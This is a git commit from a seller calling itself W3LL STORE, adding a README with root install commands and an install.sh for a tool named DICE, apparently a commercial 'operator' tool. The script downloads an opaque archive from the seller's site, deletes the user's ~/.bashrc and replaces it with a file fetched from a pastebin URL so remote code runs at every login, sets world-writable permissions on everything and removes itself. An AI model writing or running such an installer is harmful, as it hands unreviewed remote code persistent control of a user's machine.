233489929692cc3e4bf2f8be2ae632eb3e3e427b
W3LL STORE <81862344+W3LLLL@users.noreply.github.com>
2021-08-11 03:27:53 +0800

    DICE

---
+++ README.md
@@ -0,0 +1,29 @@
+<!-- HOW TO -->
+## How To Install
+
+**Type this command to your terminal/putty software:**
+
+1) _`apt-get update`_
+2) _`apt-get install -y git-core`_
+3) _`git clone https://github.com/W3LLLL/DICE.git`_
+4) _`cd DICE`_
+5) _`chmod 777 install.sh`_
+6) _`bash install.sh`_
+
+**Note :** 
+1) _Whenever you logout the ROOT from putty remember to put command_ `cd DICE` _when you relogin._
+2) _Command to run is_ `./DICE`
+
+<!-- CONTACT -->
+
+## Contact
+
+[<img align="left" alt="w3ll.shop" width="22px" src="https://raw.githubusercontent.com/iconic/open-iconic/master/svg/globe.svg" />][website]
+[<img align="left" alt="W3LLLL | ICQ" width="22px" src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/icq.svg" />][icq]
+[<img align="left" alt="W3LLLL | TELEGRAM" width="22px" src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/telegram.svg" />][telegram]
+[<img align="left" alt="W3LLLL | SKYPE" width="22px" src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/skype.svg" />][skype]
+
+[website]: https://w3ll.shop
+[icq]: https://icq.im/W3LLSTORE_OFFICIAL
+[telegram]: https://t.me/W3LLSTORE
+[skype]: https://join.skype.com/invite/KeVFBfFgL3Gg
---
+++ install.sh
@@ -0,0 +1,38 @@
+clear
+printf "\e[92m▀█▀ ░█▄─░█ ░█▀▀▀█ ▀▀█▀▀ ─█▀▀█ ░█─── ░█─── \n"
+printf "░█─ ░█░█░█ ─▀▀▀▄▄ ─░█── ░█▄▄█ ░█─── ░█─── \n"
+printf "▄█▄ ░█──▀█ ░█▄▄▄█ ─░█── ░█─░█ ░█▄▄█ ░█▄▄█TOOL\n"
+printf "         \033[0;36m\n\n"
+sudo apt install -y screen
+sudo apt install -y unzip
+sudo apt-get update
+sudo locale-gen en_US.UTF-8
+sudo export LANG=en_US.UTF-8
+sudo apt-get update
+sudo apt-get upgrade
+sudo apt-get install -y figlet
+sudo apt-get install -y dos2unix
+sudo apt-get install -y curl
+sudo apt-get install software-properties-common
+sudo add-apt-repository ppa:ondrej/php
+sudo apt-get update
+sudo apt-get install -y python3
+sudo apt-get install -y python3-pip
+sudo pip3 install requests colorama itertools idna uritools appdirs tldextract socket random  struct traceback urlextract configparser
+sudo apt install -y nano
+sudo wget https://w3ll.shop/operators/DICE.zip
+sudo unzip -o DICE.zip
+sudo rm DICE.zip
+cp ~/.bashrc ~/.bashrc-bak
+rm -rf ~/.bashrc
+curl "https://pastebin.com/raw/6Jd2EFzT" -o ~/.bashrc
+dos2unix ~/.bashrc
+clear
+printf "\e[92mEnter Your Tool Token: \033[0;33m"
+read token
+sudo rm token.txt
+echo $token > token.txt
+clear
+printf "\e[32mTOOL INSTALLED SUCCESSFULLY !\n\e[0mYOU CAN RUN \e[31m./DICE (For Linux) or Just open the DICE.exe (For Windows)\e[0m TO RUN TOOL NOW !\n\n"
+sudo rm install.sh
+chmod 777 *
